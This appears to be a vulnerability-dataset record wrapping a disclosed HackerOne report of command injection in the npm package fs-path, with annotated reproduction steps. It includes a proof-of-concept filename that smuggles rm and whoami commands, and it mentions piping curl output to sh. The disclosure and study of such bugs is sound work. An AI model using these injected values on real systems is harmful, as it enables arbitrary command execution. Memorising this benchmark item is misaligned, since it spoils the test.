@@ -1,0 +1,49 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "chalker ",
+  "title": "`fs-path` concatenates unsanitized input into exec()/execSync() commands",
+  "content": "\nI would like to report command injection in fs-path.\nIt allows to inject and execute arbitrary shell commands while performing various operations from fs-path API like copying files.\nModule\nmodule name: fs-path\nversion: 0.0.24\nnpm page: https://www.npmjs.com/package/fs-path\nModule Description\nUseful file utitiles.\nModule Stats\n108 downloads in the last day\n2 916 downloads in the last week\n13 186 downloads in the last month\nVulnerability\nVulnerability Description\nArguments are not properly escaped before being concatenated into the command that is passed to exec()/execSync().\nSee https://github.com/pillys/fs-path/blob/master/lib/index.js\nSteps To Reproduce:\nCode 152 Bytes\n1const fsPath = require('fs-path');\n2const source = '/bin/ls';\n3const target =  '/tmp/foo;rm\\t/tmp/foo;whoami>\\t/tmp/bar';\n4fsPath.copySync(source, target);\nObserve /tmp/bar being created with whoami output.\nThe same issue affects other methods in fs-path API, not just copySync.\nPatch\nThe suggested fix is to avoid using exec/execSync and instead pass parameters as an array of arguments to corresponding child_process methods.\nSupporting Material/References:\nArch Linux current\nNode.js 9.7.1\nnpm 5.7.1\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nFor setups where user input could end up in arguments of calls to fs-wrap API (like filename etc), users would be able to execute arbitrary shell commands.\nNote that sanitization of user input on the application side might not prevent this issue, as simple path sanitization that removes stuff / and .. is not enough \u2014 commands like curl example.org | sh might pass through sanitization of user input (like filenames etc.) on the application side.\n\n",
+  "severity": [
+    9.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1526066340,
+  "report_url": "https://hackerone.com/reports/324491",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the vulnerable package: `npm install fs-path@0.0.24`"
+    ],
+    [
+      2,
+      "Create a test file with malicious input: `const fsPath = require('fs-path'); const source = '/bin/ls'; const target = '/tmp/foo;rm\t/tmp/foo;whoami>\t/tmp/bar'; fsPath.copySync(source, target);`"
+    ],
+    [
+      3,
+      "Observe that `/tmp/bar` is created with the output of the `whoami` command"
+    ]
+  ],
+  "vuln_description": "The `fs-path` module concatenates unsanitized user input into `exec()`/`execSync()` commands, allowing command injection. This vulnerability enables an attacker to execute arbitrary shell commands when performing file operations like copying files.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being passed to shell commands. The attack requires no complex interactions or state manipulation, just the identification of the vulnerable function and crafting a simple payload.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection in the 'fs-path' module where unsanitized input is concatenated into exec()/execSync() commands. This is not an authentication or authorization issue (AuthN/AuthZ) but rather a command injection vulnerability. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are not applicable here.",
+    "is_detectable": false
+  }
+}
